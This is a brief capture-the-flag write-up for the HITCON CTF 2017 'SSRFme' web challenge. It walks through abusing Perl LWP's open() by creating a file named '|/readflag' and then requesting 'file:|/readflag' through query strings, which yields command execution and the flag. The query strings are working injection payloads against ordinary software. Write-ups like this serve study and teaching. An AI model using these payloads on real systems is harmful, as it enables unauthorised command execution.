# [SSRFme](https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/ssrfme/index.php)

*[HITCON ctf 2017](https://ctf2017.hitcon.org)*

* Got directory listing with `file:///proc`
* Spent some time searching for local services and processes
* Spent some time searching for vulnerabilities in php-s path operations
* Search for the `GET` command line tool used to issue requests
* Find out it's written in Perl, part of LWP or [libwwwperl](http://search.cpan.org/dist/libwww-perl/)
* Find out it is using Perl-s (`open`)[https://perldoc.perl.org/functions/open.html] function
  which is able to run commands
* `file:|/readflag` doesn't work because LWP first checks if a file exists with that name
* Create a file named `|/readflag` in the sandbox cwd
* `/?url=whatever&filename=|/readflag` creates the `|/readflag` file in cwd
* `/?url=file:|/readflag&filename=flag` executes `/readflag` and stores it in the sandbox
* `/sandbox/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/flag` downloads the flag from the sandbox
